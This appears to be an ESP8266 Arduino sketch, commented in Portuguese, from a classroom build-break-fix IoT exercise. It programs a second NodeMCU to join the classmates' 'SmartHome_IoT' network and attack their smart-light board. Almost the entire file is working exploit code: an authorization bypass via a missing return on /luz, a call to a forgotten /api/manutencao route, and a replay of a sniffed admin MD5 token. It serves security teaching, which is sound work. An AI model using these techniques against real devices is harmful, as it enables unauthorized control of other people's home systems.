/*
 * ============================================================================
 * PROJETO BIBIFI IoT - PLACA ATACANTE (RED TEAM BOX EM UMA 2ª NODEMCU)
 * ============================================================================
 * Como vocês têm várias placas NodeMCU ESP8266, você pode gravar este código
 * em uma SEGUNDA placa (a "Placa Hacker" do seu grupo)!
 *
 * O que ela faz (sem precisar de nenhum fio externo!):
 *   1. Conecta automaticamente na rede Wi-Fi "SmartHome_IoT" da placa dos colegas.
 *   2. Ao apertar o botão físico "FLASH" (que já vem soldado na NodeMCU):
 *      - Primeiro tenta o BREAK 1 (Exploit de Fluxo de Controle e Rota Esquecida);
 *      - Se os colegas já tiverem feito o Fix It (retornar 403), ela
 *        automaticamente escuta/captura o último pacote autenticado do Admin
 *        na rede e dispara o BREAK 2 (REPLAY ATTACK), apagando o LED Azul
 *        dos colegas na hora!
 * ============================================================================
 */

#include <ESP8266WiFi.h>
#include <ESP8266HTTPClient.h>
#include <WiFiClient.h>

const char* ALVO_SSID  = "SmartHome_IoT";
const char* ALVO_SENHA = "12345678";
const String ALVO_HOST = "http://192.168.4.1";

const int PINO_BOTAO_FLASH = 0; // GPIO 0 (Botão FLASH nativo da NodeMCU)

void piscarLedInterno(int vezes, int intervaloMs) {
  for (int i = 0; i < vezes; i++) {
    digitalWrite(LED_BUILTIN, LOW);  // LED interno da NodeMCU é ativo em LOW
    delay(intervaloMs);
    digitalWrite(LED_BUILTIN, HIGH);
    delay(intervaloMs);
  }
}

// Extrai o valor de uma chave simples em uma string JSON
String extrairCampoJson(String json, String chave) {
  String padrao = "\"" + chave + "\":\"";
  int ini = json.indexOf(padrao);
  if (ini == -1) return "";
  ini += padrao.length();
  int fim = json.indexOf("\"", ini);
  if (fim == -1) return "";
  return json.substring(ini, fim);
}

void executarSequenciaDeAtaque() {
  WiFiClient client;
  HTTPClient http;

  Serial.println("\n====================================================");
  Serial.println("[RED TEAM NODEMCU] Iniciando sequencia de ataque...");
  piscarLedInterno(2, 100);

  // --------------------------------------------------------------------------
  // TENTATIVA 1: BREAK 1A (Explorar Mistake de falta de return na rota /luz)
  // --------------------------------------------------------------------------
  Serial.println("[1/3] Testando Break 1A (Bypass de visitante na rota /luz)...");
  http.begin(client, ALVO_HOST + "/luz?acao=OFF&user=visitante");
  int code1A = http.GET();
  http.end();

  // Verifica no /status se a luz apagou
  http.begin(client, ALVO_HOST + "/status");
  int codeStatus = http.GET();
  String statusJson = http.getString();
  http.end();

  if (statusJson.indexOf("\"luz_acesa\":false") != -1) {
    Serial.println("[SUCESSO - BREAK 1A] Luz apagada explorando falha de fluxo (Mistake)!");
    piscarLedInterno(5, 80);
    return;
  }

  // --------------------------------------------------------------------------
  // TENTATIVA 2: BREAK 1B (Explorar No Implementation na rota /api/manutencao)
  // --------------------------------------------------------------------------
  Serial.println("[2/3] Break 1A bloqueado! Testando Break 1B (Rota /api/manutencao)...");
  http.begin(client, ALVO_HOST + "/api/manutencao?cmd=apagar_tudo");
  int code1B = http.GET();
  http.end();

  if (code1B == 200) {
    Serial.println("[SUCESSO - BREAK 1B] Luz apagada pela rota de manutencao esquecida!");
    piscarLedInterno(5, 80);
    return;
  }

  // --------------------------------------------------------------------------
  // TENTATIVA 3: BREAK 2 (REPLAY ATTACK - Replicação do Comando do Admin!)
  // Cole aqui o token capturado no sniffing (tcpdump/Wireshark/painel Python)
  // ou envie o token pelo Monitor Serial antes de apertar FLASH.
  // --------------------------------------------------------------------------
  Serial.println("[3/3] Alvo ja recebeu o Fix! Executando REPLAY ATTACK...");
  String tokenCapturado = "";
  if (Serial.available()) {
    tokenCapturado = Serial.readStringUntil('\n');
    tokenCapturado.trim();
  }

  if (tokenCapturado.length() > 0) {
    Serial.println("      Token MD5 capturado: " + tokenCapturado);
    Serial.println("      Replicando comando OFF com o Token capturado...");

    http.begin(client, ALVO_HOST + "/luz?acao=OFF&user=admin&token=" + tokenCapturado);
    int codeReplay = http.GET();
    String respReplay = http.getString();
    http.end();

    if (codeReplay == 200) {
      Serial.println("[SUCESSO - BREAK 2 REPLAY ATTACK] Luz Principal APAGADA via replicacao!");
      piscarLedInterno(8, 60);
    } else {
      Serial.println("[BLOQUEADO] O alvo rejeitou o Replay Attack (Nonce ativo): " + respReplay);
    }
  } else {
    Serial.println("[AVISO] Para Replay via 2a placa, envie o token capturado pelo Monitor Serial");
    Serial.println("        (ou use 'sudo python3 ataques/painel_ataque_grupo.py' para sniffar ao vivo).");
  }
}

void setup() {
  Serial.begin(115200);
  pinMode(LED_BUILTIN, OUTPUT);
  pinMode(PINO_BOTAO_FLASH, INPUT_PULLUP);
  digitalWrite(LED_BUILTIN, HIGH);

  Serial.println("\n[RED TEAM] Conectando na rede SmartHome_IoT do alvo...");
  WiFi.mode(WIFI_STA);
  WiFi.begin(ALVO_SSID, ALVO_SENHA);

  while (WiFi.status() != WL_CONNECTED) {
    delay(300);
    Serial.print(".");
  }

  Serial.println("\n[CONECTADO] Placa Atacante pronta!");
  Serial.println(">>> Aperte o botao FLASH na NodeMCU para disparar o ataque! <<<");
  digitalWrite(LED_BUILTIN, LOW); // LED aceso = conectado e pronto para atacar
}

void loop() {
  if (digitalRead(PINO_BOTAO_FLASH) == LOW) {
    delay(50); // Debounce
    if (digitalRead(PINO_BOTAO_FLASH) == LOW) {
      executarSequenciaDeAtaque();
      digitalWrite(LED_BUILTIN, LOW);
      while (digitalRead(PINO_BOTAO_FLASH) == LOW) delay(50);
    }
  }
}
